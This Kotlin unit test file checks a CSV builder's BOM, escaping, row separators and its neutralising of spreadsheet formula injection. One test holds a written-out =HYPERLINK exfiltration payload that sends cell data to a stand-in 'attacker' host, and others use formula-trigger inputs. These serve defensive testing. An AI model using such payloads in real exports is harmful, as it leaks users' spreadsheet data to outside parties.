package beer.thierry.centsibleexport.render.impl

import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import java.math.BigDecimal

class CsvBuilderTest {

    @Test
    fun `bytes are prefixed with a UTF-8 BOM`() {
        val out = CsvBuilder().row("a", "b").bytes()

        assertEquals(0xEF.toByte(), out[0])
        assertEquals(0xBB.toByte(), out[1])
        assertEquals(0xBF.toByte(), out[2])
    }

    @Test
    fun `row accepts varargs and serializes nulls as empty cells`() {
        val out = CsvBuilder().row("a", null, "c").bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
        assertEquals("a,,c\r\n", out)
    }

    @Test
    fun `row accepts a list of mixed types and stringifies each cell`() {
        val out = CsvBuilder().row(listOf("name", 42, 3.14, true)).bytes()
            .drop(3).toByteArray().toString(Charsets.UTF_8)
        assertEquals("name,42,3.14,true\r\n", out)
    }

    @Test
    fun `cells containing commas and quotes are properly RFC4180 escaped`() {
        val out = CsvBuilder()
            .row("hello, world", """she said "hi"""")
            .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
        assertEquals("\"hello, world\",\"she said \"\"hi\"\"\"\r\n", out)
    }

    @Test
    fun `multiple rows are separated by CRLF`() {
        val out = CsvBuilder()
            .row("a", "b")
            .row("c", "d")
            .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
        assertTrue(out.contains("a,b\r\nc,d\r\n"))
    }

    @Test
    fun `string cells starting with a formula trigger are prefixed with a single quote`() {
        val out = CsvBuilder()
            .row("=1+1", "-2+3", "+5", "@SUM(A1)")
            .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
        assertEquals("'=1+1,'-2+3,'+5,'@SUM(A1)\r\n", out)
    }

    @Test
    fun `leading tab and carriage-return string cells are neutralized with a single quote`() {
        val out = CsvBuilder()
            .row("\tdanger", "\rdanger")
            .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
        assertTrue(out.contains("'\tdanger"), "tab cell should be prefixed: $out")
        assertTrue(out.contains("'\rdanger"), "carriage-return cell should be prefixed: $out")
    }

    @Test
    fun `the HYPERLINK exfiltration payload is neutralized`() {
        val out = CsvBuilder()
            .row("""=HYPERLINK("http://attacker/?d="&A1,"open")""")
            .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
        assertTrue(out.contains("'=HYPERLINK"), "payload should be prefixed with the text-marker quote: $out")
    }

    @Test
    fun `non-string cells are never treated as formulas`() {
        val out = CsvBuilder()
            .row("balance", BigDecimal("-50.00"), -3)
            .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
        assertEquals("balance,-50.00,-3\r\n", out)
    }

    @Test
    fun `safe string cells are passed through unchanged`() {
        val out = CsvBuilder()
            .row("Groceries", "Rent payment")
            .bytes().drop(3).toByteArray().toString(Charsets.UTF_8)
        assertEquals("Groceries,Rent payment\r\n", out)
    }
}
